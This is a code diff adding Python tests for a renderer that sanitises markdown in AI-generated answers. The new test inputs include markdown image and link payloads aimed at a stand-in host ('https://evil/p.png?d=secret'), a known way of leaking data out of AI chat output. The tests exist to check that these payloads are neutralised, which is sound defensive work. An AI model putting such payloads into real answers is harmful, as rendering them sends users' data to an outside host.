@@ -252,3 +252,36 @@ def test_answer_markdown_strips_images_and_links_keeps_markers() -> None:
     assert "![" not in out and "evil" not in out and "(http" not in out
     assert "click" in out and "[1]" in out
     assert "\\<b\\>" in out and "<b>" not in out
+
+
+def _live_brackets(out: str) -> list[str]:
+    """Unescaped `[`/`]` other than plain `[n]` markers: anything that could form a link."""
+    plain = re.sub(r"(?<!\\)\[\d+\](?![(\[:])", "", out)
+    return re.findall(r"(?<!\\)[\[\]]", plain)
+
+
+def test_answer_reference_style_image_and_definition_are_inert() -> None:
+    md = "Spend rose [1].\n\n![x][1]\n[y][evil]\n\n[1]: https://evil/p.png?d=secret\n[evil]: https://e"
+    out = render_answer(Answer(answer_markdown=md, citations=[], found=True))
+    assert _live_brackets(out) == []
+    assert not re.search(r"(?m)^\s{0,3}\[[^\]]+\]:", out)  # no live reference definition
+    assert "Spend rose [1]." in out
+
+
+def test_answer_nested_brackets_and_escape_tricks_are_inert() -> None:
+    for md in ("[a [b]](https://evil/l)", "![a [b]](https://evil/p.png)", "\\[x](https://e)"):
+        out = render_answer(Answer(answer_markdown=md, citations=[], found=True))
+        assert _live_brackets(out) == [], md
+
+
+def test_answer_marker_never_becomes_a_link() -> None:
+    md = "Claim [1](https://evil/l) and [2][3] then [4]"
+    out = render_answer(Answer(answer_markdown=md, citations=[], found=True))
+    assert "[1](" not in out and "[4]" in out
+    assert _live_brackets(out) == []
+
+
+def test_answer_keeps_markdown_emphasis_and_lists() -> None:
+    md = "**Total** is *high*\n\n- one [1]\n- two [2]\n\n| a | b |"
+    out = render_answer(Answer(answer_markdown=md, citations=[], found=True))
+    assert out == md
